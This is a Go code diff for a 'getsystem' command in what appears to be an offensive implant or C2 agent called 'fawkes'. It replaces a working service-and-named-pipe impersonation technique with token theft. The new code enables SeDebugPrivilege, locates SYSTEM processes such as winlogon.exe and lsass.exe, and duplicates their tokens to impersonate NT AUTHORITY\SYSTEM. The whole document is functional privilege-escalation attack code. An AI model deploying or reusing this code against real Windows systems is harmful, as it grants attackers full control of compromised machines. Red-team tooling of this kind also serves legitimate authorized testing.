@@ -4,19 +4,14 @@
 package commands
 
 import (
-	"crypto/rand"
-	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"os"
-	"runtime"
 	"strings"
 	"unsafe"
 
 	"fawkes/pkg/structs"
 
 	"golang.org/x/sys/windows"
-	"golang.org/x/sys/windows/svc/mgr"
 )
 
 // Windows API procedures for named pipe impersonation
@@ -43,7 +38,7 @@ func (c *GetSystemCommand) Name() string {
 }
 
 func (c *GetSystemCommand) Description() string {
-	return "Elevate to SYSTEM via named pipe impersonation (requires SeImpersonate privilege)"
+	return "Elevate to SYSTEM via token stealing from a SYSTEM process (requires SeDebugPrivilege)"
 }
 
 type getSystemArgs struct {
@@ -62,245 +57,121 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Default to service trigger
+	// Default to token stealing
 	if args.Technique == "" {
-		args.Technique = "service"
+		args.Technique = "steal"
 	}
 
 	// Get current identity before escalation
 	oldIdentity, _ := GetCurrentIdentity()
 
 	switch strings.ToLower(args.Technique) {
-	case "service":
-		return getSystemViaService(oldIdentity)
+	case "steal":
+		return getSystemViaSteal(oldIdentity)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown technique: %s. Available: service", args.Technique),
+			Output:    fmt.Sprintf("Unknown technique: %s. Available: steal", args.Technique),
 			Status:    "error",
 			Completed: true,
 		}
 	}
 }
 
-// createPermissiveSA creates a SECURITY_ATTRIBUTES with a NULL DACL,
-// allowing any process (including SYSTEM) to connect to the pipe.
-func createPermissiveSA() (*windows.SecurityAttributes, *windows.SECURITY_DESCRIPTOR, error) {
-	sd, err := windows.NewSecurityDescriptor()
-	if err != nil {
-		return nil, nil, fmt.Errorf("NewSecurityDescriptor: %v", err)
+// getSystemViaSteal finds a SYSTEM process and steals its token using
+// OpenProcess + OpenProcessToken + DuplicateTokenEx + ImpersonateLoggedOnUser.
+// Requires SeDebugPrivilege (available on elevated admin processes).
+func getSystemViaSteal(oldIdentity string) structs.CommandResult {
+	// Enable SeDebugPrivilege to access SYSTEM processes
+	if err := enableDebugPrivilege(); err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to enable SeDebugPrivilege: %v (need admin privileges)", err),
+			Status:    "error",
+			Completed: true,
+		}
 	}
 
-	// Set a NULL DACL — allows all access
-	if err := sd.SetDACL(nil, true, false); err != nil {
-		return nil, nil, fmt.Errorf("SetDACL: %v", err)
-	}
-
-	sa := &windows.SecurityAttributes{
-		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
-		SecurityDescriptor: sd,
-		InheritHandle:      0,
-	}
-	return sa, sd, nil
-}
-
-// getSystemViaService creates a named pipe, creates a Windows service whose
-// binpath writes to that pipe (running as SYSTEM), then impersonates the
-// connecting client to obtain a SYSTEM token.
-func getSystemViaService(oldIdentity string) structs.CommandResult {
-	// Lock OS thread — ImpersonateNamedPipeClient and OpenThreadToken
-	// must run on the same OS thread
-	runtime.LockOSThread()
-	defer runtime.UnlockOSThread()
-
-	// Generate random pipe name
-	pipeName, err := randomPipeName()
+	// Find a SYSTEM process to steal from
+	// Try well-known SYSTEM processes in order of preference:
+	// 1. winlogon.exe — always SYSTEM, one per session
+	// 2. lsass.exe — always SYSTEM, critical process
+	// 3. services.exe — always SYSTEM
+	// 4. Any process running as SYSTEM
+	systemPID, processName, err := findSystemProcess()
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to generate pipe name: %v", err),
+			Output:    fmt.Sprintf("Failed to find a SYSTEM process: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
 	}
-	pipeFullPath := `\\.\pipe\` + pipeName
 
-	// Create permissive security descriptor (NULL DACL) to allow SYSTEM to connect
-	sa, _, err := createPermissiveSA()
+	// Revert any existing impersonation first
+	RevertCurrentToken()
+
+	// Open target process
+	hProcess, err := windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, systemPID)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create security descriptor: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Create an event for overlapped I/O
-	hEvent, _, eventErr := procCreateEventW.Call(0, 1, 0, 0) // manual reset, initially non-signaled
-	if hEvent == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateEventW failed: %v", eventErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	defer windows.CloseHandle(windows.Handle(hEvent))
-
-	// Create named pipe with overlapped I/O for proper timeout support
-	pipeNamePtr, err := windows.UTF16PtrFromString(pipeFullPath)
-	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create pipe name: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	hPipe, _, pipeErr := procCreateNamedPipeW.Call(
-		uintptr(unsafe.Pointer(pipeNamePtr)),
-		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
-		PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT,
-		PIPE_UNLIMITED_INSTANCES,
-		512,  // out buffer size
-		512,  // in buffer size
-		5000, // default timeout (5s)
-		uintptr(unsafe.Pointer(sa)),
-	)
-	if hPipe == uintptr(windows.InvalidHandle) {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CreateNamedPipeW failed: %v", pipeErr),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	defer windows.CloseHandle(windows.Handle(hPipe))
-
-	// Start overlapped ConnectNamedPipe BEFORE creating the service
-	// This ensures we're listening when the service starts
-	overlapped := windows.Overlapped{
-		HEvent: windows.Handle(hEvent),
-	}
-	ret, _, connectErr := procConnectNamedPipe.Call(
-		hPipe,
-		uintptr(unsafe.Pointer(&overlapped)),
-	)
-	if ret == 0 {
-		// Expected: ERROR_IO_PENDING means waiting for connection
-		// ERROR_PIPE_CONNECTED means client already connected
-		if connectErr != windows.ERROR_IO_PENDING && connectErr != windows.ERROR_PIPE_CONNECTED {
+		// Try with limited information access
+		hProcess, err = windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, systemPID)
+		if err != nil {
 			return structs.CommandResult{
-				Output:    fmt.Sprintf("ConnectNamedPipe failed: %v", connectErr),
+				Output:    fmt.Sprintf("OpenProcess failed for PID %d (%s): %v", systemPID, processName, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}
+	defer windows.CloseHandle(hProcess)
+
+	// Open process token
+	var hToken windows.Token
+	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
+	if err != nil {
+		// Fall back to specific rights
+		err = windows.OpenProcessToken(hProcess, STEAL_TOKEN_ACCESS, &hToken)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("OpenProcessToken failed for PID %d (%s): %v", systemPID, processName, err),
 				Status:    "error",
 				Completed: true,
 			}
 		}
 	}
 
-	alreadyConnected := (connectErr == windows.ERROR_PIPE_CONNECTED)
-
-	// Create a temporary service that writes to our pipe
-	// Full path to cmd.exe avoids PATH lookup issues under SCM
-	svcName := "fwk" + pipeName[:8]
-	systemRoot := os.Getenv("SystemRoot")
-	if systemRoot == "" {
-		systemRoot = `C:\Windows`
-	}
-	binPath := fmt.Sprintf(`"%s\System32\cmd.exe" /c echo fawkes > %s`, systemRoot, pipeFullPath)
-
-	scm, err := mgr.Connect()
-	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to connect to SCM: %v (need admin privileges)", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-	defer scm.Disconnect()
-
-	svcHandle, err := scm.CreateService(svcName, binPath, mgr.Config{
-		StartType:    uint32(mgr.StartManual),
-		ErrorControl: mgr.ErrorIgnore,
-	})
-	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create service '%s': %v (need admin privileges)", svcName, err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Ensure service is cleaned up
-	defer func() {
-		svcHandle.Delete()
-		svcHandle.Close()
-	}()
-
-	// Start the service — the SCM will run cmd.exe as SYSTEM which connects to our pipe
-	startErr := svcHandle.Start()
-	// Expected to error because cmd.exe is not a real service, but it still runs the binary
-
-	// Wait for the pipe connection (overlapped I/O)
-	if !alreadyConnected {
-		waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), 10000) // 10s timeout
-		if waitResult != windows.WAIT_OBJECT_0 {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges. Service: %s, binpath: %s, startErr: %v", svcName, binPath, startErr),
-				Status:    "error",
-				Completed: true,
-			}
-		}
-	}
-
-	// Impersonate the connected client (SYSTEM)
-	ret, _, err = procImpersonateNamedPipeClient.Call(hPipe)
-	if ret == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("ImpersonateNamedPipeClient failed: %v (need SeImpersonate privilege)", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Get the impersonation token from current thread
-	var threadToken windows.Token
-	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &threadToken)
-	if err != nil {
-		procRevertToSelf.Call()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("OpenThreadToken failed after impersonation: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
-	}
-
-	// Duplicate to a primary token for full use
-	var primaryToken windows.Token
+	// Duplicate the token
+	var duplicatedToken windows.Token
 	err = windows.DuplicateTokenEx(
-		threadToken,
+		hToken,
 		windows.MAXIMUM_ALLOWED,
 		nil,
-		windows.SecurityImpersonation,
+		windows.SecurityDelegation,
 		windows.TokenPrimary,
-		&primaryToken,
+		&duplicatedToken,
 	)
-	threadToken.Close()
-
 	if err != nil {
-		procRevertToSelf.Call()
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
-			Status:    "error",
-			Completed: true,
+		// Try with SecurityImpersonation
+		err = windows.DuplicateTokenEx(
+			hToken,
+			windows.MAXIMUM_ALLOWED,
+			nil,
+			windows.SecurityImpersonation,
+			windows.TokenImpersonation,
+			&duplicatedToken,
+		)
+		if err != nil {
+			hToken.Close()
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("DuplicateTokenEx failed: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
 		}
 	}
+	hToken.Close()
 
-	// Revert before storing (SetIdentityToken will call ImpersonateLoggedOnUser)
-	procRevertToSelf.Call()
-
-	// Disconnect pipe client
-	procDisconnectNamedPipe.Call(hPipe)
-
-	// Store the SYSTEM token using existing token infrastructure
-	if err := SetIdentityToken(primaryToken); err != nil {
-		windows.CloseHandle(windows.Handle(primaryToken))
+	// Store the SYSTEM token using existing infrastructure
+	if err := SetIdentityToken(duplicatedToken); err != nil {
+		windows.CloseHandle(windows.Handle(duplicatedToken))
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Failed to impersonate SYSTEM token: %v", err),
 			Status:    "error",
@@ -308,11 +179,11 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 		}
 	}
 
-	// Verify the new identity
+	// Verify
 	newIdentity, err := GetCurrentIdentity()
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("SYSTEM token obtained but failed to verify: %v", err),
+			Output:    fmt.Sprintf("Token stolen but failed to verify identity: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
@@ -320,12 +191,11 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 
 	var sb strings.Builder
 	sb.WriteString("Successfully elevated to SYSTEM\n")
-	sb.WriteString("Technique: Service named pipe impersonation\n")
+	sb.WriteString(fmt.Sprintf("Technique: Token steal from %s (PID %d)\n", processName, systemPID))
 	if oldIdentity != "" {
 		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
 	}
 	sb.WriteString(fmt.Sprintf("New: %s\n", newIdentity))
-	sb.WriteString(fmt.Sprintf("Service '%s' created and deleted\n", svcName))
 	sb.WriteString("Use rev2self to revert to original context")
 
 	return structs.CommandResult{
@@ -335,11 +205,138 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	}
 }
 
-// randomPipeName generates a random pipe name using crypto/rand
-func randomPipeName() (string, error) {
-	b := make([]byte, 8)
-	if _, err := rand.Read(b); err != nil {
-		return "", err
+// findSystemProcess enumerates processes and finds one running as NT AUTHORITY\SYSTEM.
+// Tries well-known SYSTEM processes first, then falls back to scanning all processes.
+func findSystemProcess() (uint32, string, error) {
+	// Take a snapshot of all processes
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return 0, "", fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
 	}
-	return hex.EncodeToString(b), nil
+	defer windows.CloseHandle(snapshot)
+
+	var entry windows.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	// Preferred SYSTEM processes (in order of preference)
+	preferred := []string{"winlogon.exe", "lsass.exe", "services.exe", "svchost.exe"}
+	preferredMap := make(map[string]bool)
+	for _, p := range preferred {
+		preferredMap[p] = true
+	}
+
+	type processInfo struct {
+		pid  uint32
+		name string
+	}
+	var preferredProcesses []processInfo
+	var otherProcesses []processInfo
+
+	err = windows.Process32First(snapshot, &entry)
+	if err != nil {
+		return 0, "", fmt.Errorf("Process32First: %v", err)
+	}
+
+	for {
+		name := windows.UTF16ToString(entry.ExeFile[:])
+		pid := entry.ProcessID
+
+		if pid > 4 { // Skip System (4) and Idle (0)
+			if isSystemProcess(pid) {
+				if preferredMap[strings.ToLower(name)] {
+					preferredProcesses = append(preferredProcesses, processInfo{pid, name})
+				} else {
+					otherProcesses = append(otherProcesses, processInfo{pid, name})
+				}
+			}
+		}
+
+		err = windows.Process32Next(snapshot, &entry)
+		if err != nil {
+			break
+		}
+	}
+
+	// Return preferred processes first (winlogon > lsass > services > svchost)
+	for _, pref := range preferred {
+		for _, p := range preferredProcesses {
+			if strings.EqualFold(p.name, pref) {
+				return p.pid, p.name, nil
+			}
+		}
+	}
+
+	// Fall back to any SYSTEM process
+	if len(otherProcesses) > 0 {
+		return otherProcesses[0].pid, otherProcesses[0].name, nil
+	}
+
+	return 0, "", fmt.Errorf("no SYSTEM process found (are you running as admin?)")
+}
+
+// isSystemProcess checks if a process is running as NT AUTHORITY\SYSTEM
+func isSystemProcess(pid uint32) bool {
+	hProcess, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+	if err != nil {
+		return false
+	}
+	defer windows.CloseHandle(hProcess)
+
+	var token windows.Token
+	err = windows.OpenProcessToken(hProcess, TOKEN_QUERY, &token)
+	if err != nil {
+		return false
+	}
+	defer token.Close()
+
+	tokenUser, err := token.GetTokenUser()
+	if err != nil {
+		return false
+	}
+
+	// Check if the SID is NT AUTHORITY\SYSTEM (S-1-5-18)
+	systemSID, err := windows.StringToSid("S-1-5-18")
+	if err != nil {
+		return false
+	}
+
+	return tokenUser.User.Sid.Equals(systemSID)
+}
+
+// enableDebugPrivilege enables SeDebugPrivilege on the current process token
+func enableDebugPrivilege() error {
+	var token windows.Token
+	processHandle, err := windows.GetCurrentProcess()
+	if err != nil {
+		return err
+	}
+
+	err = windows.OpenProcessToken(processHandle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
+	if err != nil {
+		return err
+	}
+	defer token.Close()
+
+	var luid windows.LUID
+	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
+	if err != nil {
+		return err
+	}
+
+	tp := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{
+				Luid:       luid,
+				Attributes: windows.SE_PRIVILEGE_ENABLED,
+			},
+		},
+	}
+
+	err = windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil)
+	if err != nil {
+		return err
+	}
+
+	return nil
 }
